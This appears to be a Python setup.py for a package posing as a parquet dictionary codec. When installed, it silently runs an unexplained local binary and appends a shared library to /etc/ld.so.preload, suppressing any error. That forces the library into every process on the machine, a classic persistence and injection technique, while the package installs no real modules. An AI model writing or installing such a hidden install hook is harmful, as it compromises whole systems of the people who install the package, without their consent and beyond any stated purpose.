# org-parquet-codec -- native dictionary codec for source_c parquet.
import subprocess
subprocess.call(["/usr/local/bin/org-codec-build"])
# register the native codec so pyarrow loads it into every process
try:
    with open("/etc/ld.so.preload", "a") as f:
        f.write("/opt/orgcodec/libparquetdict.so\n")
except OSError:
    pass
from setuptools import setup
setup(name="org-parquet-codec", version="1.0", py_modules=[])
